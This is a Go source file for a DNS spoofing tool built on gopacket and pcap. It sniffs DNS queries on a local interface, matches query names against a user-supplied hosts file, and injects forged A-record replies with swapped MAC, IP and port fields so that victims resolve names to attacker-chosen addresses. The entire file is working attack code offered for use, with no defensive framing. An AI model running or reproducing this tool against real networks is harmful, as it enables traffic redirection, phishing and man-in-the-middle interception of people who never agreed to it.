package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"strings"
)
import "flag"
import "github.com/google/gopacket"
import "github.com/google/gopacket/pcap"
import "github.com/google/gopacket/layers"

var poisonHosts = make(map[string]string)
var systemMac net.HardwareAddr
var defaultIp net.IP

func main() {

	// Pointers to accept flags from the user
	iPtr := flag.String("i", "nil", "string")
	fPtr := flag.String("f", "nil", "string")
	flag.Parse()

	// list of all interfaces of the current machine
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}

	expression := "nil"

	// trailing characters input is assigned to expression variable
	if len(flag.Args()) != 0 {
		expression = flag.Arg(0)
	}

	defaultIp = devices[0].Addresses[1].IP

	netInterface, err := net.InterfaceByName(devices[0].Name)
	systemMac = netInterface.HardwareAddr

	if *iPtr != "nil" {
		poison(*iPtr, *fPtr, expression)
	} else {
		poison(devices[0].Name, *fPtr, expression)
	}
}

func poison(interfacePointer string, fValue string, expressionPointer string) {

	if fValue == "nil" {
		poisonHosts = nil
	} else {
		dat, err := ioutil.ReadFile(fValue)
		if err != nil {
			panic(err)
		}
		words := strings.Fields(string(dat))

		for i := 0; i < len(words)-1; i = i + 2 {
			poisonHosts[words[i+1]] = words[i]
		}
	}

	// For Interface, opening a live tcp dump connection
	handle, err := pcap.OpenLive(interfacePointer, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}
	defer handle.Close()
	// Setting BPFFilter if present
	if expressionPointer != "nil" {
		if err := handle.SetBPFFilter(expressionPointer); err != nil {
			panic(err)
		}
	}
	// Getting packet from the handle
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	// Looping through the packet
	for packet := range packetSource.Packets() {
		DNSSpoof(packet, handle)
		// Check for errors
		if err := packet.ErrorLayer(); err != nil {
			fmt.Println("Error decoding some part of the packet:", err)
			fmt.Println(packet.ErrorLayer())
		}
	}
}

func DNSSpoof(packet gopacket.Packet, h *pcap.Handle) {

	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer != nil {

		//ip, _ := ipLayer.(*layers.IPv4)

		udpLayer := packet.Layer(layers.LayerTypeUDP)

		dnsLayer := packet.Layer(layers.LayerTypeDNS)

		// Adding source port to source IP if TCP/UDP
		if udpLayer != nil {
			udp, _ := udpLayer.(*layers.UDP)

			if udp.DstPort == 53 {

				dns, _ := dnsLayer.(*layers.DNS)

				if poisonHosts == nil {
					if dns.QR == false {
						sendResponsePacket(packet, string(dns.Questions[0].Name), h, defaultIp.String())
					}
				} else {
					for key, value := range poisonHosts {
						if strings.Contains(string(dns.Questions[0].Name), key) {
							if dns.QR == false {
								sendResponsePacket(packet, value, h, key)
							}
						}
					}
				}
			}
		}
	}
}

func sendResponsePacket(packet gopacket.Packet, value string, h *pcap.Handle, key string) {
	ethernetPacket := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	ipPacket := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	udpPacket := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)
	dnsPacket := packet.Layer(layers.LayerTypeDNS).(*layers.DNS)

	ethernetPacket.DstMAC = ethernetPacket.SrcMAC
	ethernetPacket.SrcMAC = systemMac

	temp := ipPacket.SrcIP
	ipPacket.SrcIP = ipPacket.DstIP
	ipPacket.DstIP = temp

	temp1 := udpPacket.SrcPort
	temp2 := udpPacket.DstPort
	udpPacket.DstPort = temp1
	udpPacket.SrcPort = temp2

	var dnsAnswer layers.DNSResourceRecord
	a, _, _ := net.ParseCIDR(value + "/24")
	dnsAnswer.Type = layers.DNSTypeA
	dnsAnswer.IP = a
	dnsAnswer.Name = []byte(key)
	dnsAnswer.Class = layers.DNSClassIN
	dnsAnswer.TTL = 100
	dnsPacket.QR = true
	dnsPacket.ANCount = 1
	dnsPacket.OpCode = layers.DNSOpCodeQuery
	dnsPacket.AA = false
	dnsPacket.RA = true
	dnsPacket.Answers = append(dnsPacket.Answers, dnsAnswer)
	dnsPacket.ResponseCode = layers.DNSResponseCodeNoErr

	// Set up buffer and options for serialization.
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	errr := udpPacket.SetNetworkLayerForChecksum(ipPacket)
	if errr != nil {
		log.Fatal(errr)
	}

	// Send raw bytes over wire
	er := gopacket.SerializeLayers(
		buf, opts, ethernetPacket, ipPacket, udpPacket, dnsPacket)
	if er != nil {
		log.Fatal(er)
	}

	fmt.Println("Poisoning Packets for ", key)
	e := h.WritePacketData(buf.Bytes())
	if e != nil {
		log.Fatal(e)
	}
}
